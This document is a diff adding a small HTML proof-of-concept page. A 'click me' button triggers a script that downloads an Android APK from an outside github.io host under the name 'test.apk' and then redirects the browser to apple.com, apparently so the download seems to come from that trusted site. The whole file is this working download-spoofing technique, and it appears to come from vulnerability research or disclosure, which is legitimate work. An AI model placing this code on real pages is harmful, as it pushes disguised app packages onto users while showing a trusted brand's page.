@@ -1,0 +1,20 @@
+<h1><button id="poc">click me</button></h1>
+<script>
+  function down(uri, name) {
+  var link = document.createElement("a");
+  link.download = name;
+  link.href = uri;
+  link.click();
+}
+async function init(e) {
+  try {
+    down("https://ybt01.github.io/app-debug.apk", "test.apk")
+   setTimeout(() => {
+    location.href="https://www.apple.com";
+   }, 1000);
+  } catch (e) {
+    //
+  }
+}
+  document.querySelector('#poc').addEventListener('click', e => init(e));
+</script>
